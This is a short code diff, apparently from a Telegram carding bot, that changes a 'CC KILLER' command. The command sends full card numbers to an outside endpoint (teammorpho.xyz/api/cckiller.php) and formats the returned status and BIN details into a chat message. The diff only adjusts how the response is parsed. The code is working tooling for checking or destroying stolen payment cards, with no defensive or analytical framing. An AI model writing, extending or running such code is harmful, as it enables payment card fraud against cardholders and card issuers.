@@ -147,9 +147,8 @@ Retry After {after}s
                             tic = time.perf_counter()
                             authurl = f"https://teammorpho.xyz/api/cckiller.php?lista={fullcc}"
                             reqone = session.get(authurl)
-                            data = json.loads(reqone)
-                            stat = data["status"]
-                            ress = data["resp"]
+                            data = reqone.json()
+                            stat = data["respp"]
                             fourthresp = f"""
 <b> CC KILLER
 ━━━━━━━━━
@@ -234,7 +233,6 @@ Retry After {after}s
 ┏－－－－－－－－－－－－－－－－－－┒</b>
 ┠ Card - <code>{fullcc}</code> 
 ┠ Status - <code>{stat}</code>
-┠ Resp - <code>{ress}</code>
 ┠－－－－－－－－－－－－－－－－
 ┠ BIN INFO
 ┠ Bin - {fbin} - {brand} - {type} - {level}
